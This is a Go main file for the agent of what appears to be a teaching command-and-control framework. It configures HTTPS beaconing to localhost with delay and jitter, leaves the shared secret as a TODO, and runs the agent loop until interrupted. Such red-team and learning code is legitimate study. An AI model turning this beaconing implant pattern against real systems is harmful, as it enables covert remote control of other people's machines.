package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"time"

	"c2framework/internals/agent"
	"c2framework/internals/config"
)

func main() {
	// Create agent config directly in code
	cfg := &config.AgentConfig{
		Protocol:   "https",
		ServerIP:   "127.0.0.1",
		ServerPort: "8443",
		// TODO: Assign SharedSecret
		Timing: config.TimingConfig{
			Delay:  5 * time.Second,
			Jitter: 50,
		},
	}

	// Call our factory function
	comm, err := agent.NewAgent(cfg)
	if err != nil {
		log.Fatalf("Failed to create agent: %v", err)
	}

	// Create context for cancellation
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start run loop in goroutine
	go func() {
		log.Printf("Starting %s client run loop", cfg.Protocol)
		log.Printf("Delay: %v, Jitter: %d%%", cfg.Timing.Delay, cfg.Timing.Jitter)

		if err := agent.RunLoop(ctx, comm, cfg); err != nil {
			log.Printf("Run loop error: %v", err)
		}
	}()

	// Wait for interrupt signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan

	log.Println("Shutting down client...")
	cancel() // This will cause the run loop to exit
}
